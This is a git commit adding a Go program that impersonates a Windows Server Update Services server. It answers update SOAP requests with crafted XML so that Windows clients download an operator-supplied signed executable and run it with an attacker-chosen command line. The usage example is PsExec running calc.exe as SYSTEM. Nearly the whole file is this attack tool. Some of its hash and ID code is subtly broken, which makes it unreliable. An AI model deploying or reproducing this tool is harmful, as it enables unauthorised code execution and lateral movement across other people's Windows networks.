174e10c087a83ba704e3ede51ccb6ddd0dbc005c
zzuf <maori1006@gmail.com>
2022-03-06 02:04:57 +0900

    brefore test

---
+++ main.go
@@ -0,0 +1,188 @@
+package main
+
+import (
+	"crypto/sha1"
+	"crypto/sha256"
+	"encoding/base64"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"math/rand"
+	"net/http"
+	"os"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"github.com/google/uuid"
+	flags "github.com/jessevdk/go-flags"
+)
+
+var getConfigXml string
+var getCookieXml string
+var registerComputerXml string
+var syncUpdateXml string
+var getExtendedUpdateInfoXml string
+var reportEventBatchXml string
+var getAuthorizationCookieXml string
+
+var revisionIds []string = []string{string(999999 - rand.Intn(99999)), string(999999 - rand.Intn(99999))}
+var deploymentIds []string = []string{string(99999 - rand.Intn(19999)), string(99999 - rand.Intn(19999))}
+
+var executableFile *os.File
+var executeCommand string
+var filePath string
+var serverAddress string
+var serverPort string
+
+var opts struct {
+	Host       []string `short:"H" long:"host" description:"The listening adress." default:"127.0.0.1"`
+	Port       []string `short:"p" long:"port" description:"The listening port." default:"8530"`
+	Executable []string `short:"e" long:"executable" description:"The Microsoft signed executable returned to the client." required:"true"`
+	Command    []string `short:"c" long:"command" description:"The parameters for the current executable." required:"true"`
+}
+
+func setResourcesXml() {
+	var f []byte
+	u1, _ := uuid.NewRandom()
+	u2, _ := uuid.NewRandom()
+	u3, _ := uuid.NewRandom()
+
+	ef, _ := ioutil.ReadFile(filePath)
+	sha1Str := string(sha1.New().Sum(ef))
+	sha256Str := string(sha256.New().Sum(ef))
+	fileSize := string(len(ef))
+	fileName := filepath.Base(filePath)
+	fileDownloadURL := "http://" + serverAddress + ":" + serverPort + "/" + u3.String() + "/" + fileName
+
+	lastChangeDate := time.Now().Add(time.Duration(24) * time.Hour * -3).Format(time.RFC3339)
+	expireDate := time.Now().Add(time.Duration(24) * time.Hour * 1).Format(time.RFC3339)
+	cookieValue := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("A", 47)))
+
+	f, _ = ioutil.ReadFile("./resources/get-config.xml")
+	getConfigXml = strings.NewReplacer("{lastChange}", lastChangeDate).Replace(string(f))
+
+	f, _ = ioutil.ReadFile("./resources/get-cookie.xml")
+	getCookieXml = strings.NewReplacer("{expire}", expireDate, "{cookie}", cookieValue).Replace(string(f))
+
+	f, _ = ioutil.ReadFile("./resources/register-computer.xml")
+	registerComputerXml = string(f)
+
+	f, _ = ioutil.ReadFile("./resources/sync-updates.xml")
+	syncUpdateXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
+		"{deployment_id1}", deploymentIds[0], "{deployment_id2}", deploymentIds[1],
+		"{uuid1}", u1.String(), "{uuid2}", u2.String(),
+		"{expire}", expireDate, "{cookie}", cookieValue).Replace(string(f))
+
+	f, _ = ioutil.ReadFile("./resources/get-extended-update-info.xml")
+	getExtendedUpdateInfoXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
+		"{sha1}", sha1Str, "{sha256}", sha256Str, "{filename}", fileName,
+		"{file_size}", fileSize, "{command}", executeCommand, "{url}", fileDownloadURL).Replace(string(f))
+
+	f, _ = ioutil.ReadFile("./resources/report-event-batch.xml")
+	reportEventBatchXml = string(f)
+
+	f, _ = ioutil.ReadFile("./resources/get-authorization-cookie.xml")
+	getAuthorizationCookieXml = strings.NewReplacer("{cookie}", cookieValue).Replace(string(f))
+}
+
+func rootHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodGet || r.Method == http.MethodHead {
+		doHeadOrGet(w, r)
+	} else if r.Method == http.MethodPost {
+		doPost(w, r)
+	} else {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+	}
+}
+
+func wsusBaseServer() {
+	setResourcesXml()
+
+	http.HandleFunc("/", rootHandler)
+	fmt.Printf("Starting server...")
+
+	if err := http.ListenAndServe(":"+serverPort, nil); err != nil {
+		log.Fatal("Server Run Failed.: ", err)
+	}
+}
+
+func doHeadOrGet(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Cache-Control", "private")
+	w.Header().Set("X-AspNet-Version", "4.0.30319")
+	w.Header().Set("X-Powered-By", "ASP.NET")
+
+	if strings.Contains(r.RequestURI, ".exe") {
+		w.Header().Set("Content-type", "application/octet-stream")
+		if r.Method == "GET" {
+			ef, _ := ioutil.ReadFile(filePath)
+			w.WriteHeader(http.StatusOK)
+			w.Write(ef)
+		} else {
+			//if Header is HEAD
+			w.WriteHeader(http.StatusOK)
+			w.Write(nil)
+		}
+	} else {
+		w.Header().Set("Content-type", "text/xml; charset=utf-8")
+		w.WriteHeader(http.StatusOK)
+		w.Write(nil)
+	}
+
+}
+
+func doPost(w http.ResponseWriter, r *http.Request) {
+	soapAction := r.Header["SOAPAction"][0]
+	w.Header().Set("Content-type", "application/xml")
+
+	if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(getConfigXml))
+	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(getCookieXml))
+	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(registerComputerXml))
+	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(syncUpdateXml))
+	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(getExtendedUpdateInfoXml))
+	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(reportEventBatchXml))
+	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie\"" {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte(getAuthorizationCookieXml))
+	} else {
+		w.Header().Del("Content-type")
+		w.WriteHeader(http.StatusNotFound)
+		w.Write(nil)
+	}
+}
+
+func main() {
+	_, err := flags.Parse(&opts)
+	if err != nil {
+		//log.Fatal(err)
+		log.Fatal("Example: \ngowsus.exe -H X.X.X.X -p 8530 -e PsExec64.exe -c \"-accepteula -s calc.exe\"")
+	}
+
+	fmt.Printf("Host: %s\n", opts.Host)
+	fmt.Printf("Port: %s\n", opts.Port)
+	fmt.Printf("Executable: %s\n", opts.Executable)
+	fmt.Printf("Command: %s\n", opts.Command)
+
+	executeCommand = opts.Command[0]
+	serverAddress = opts.Host[0]
+	serverPort = opts.Port[0]
+	filePath = opts.Executable[0]
+
+	if _, err := os.Stat(filePath); err != nil {
+		log.Fatal("Executable file not found.")
+	}
+
+	wsusBaseServer()
+}
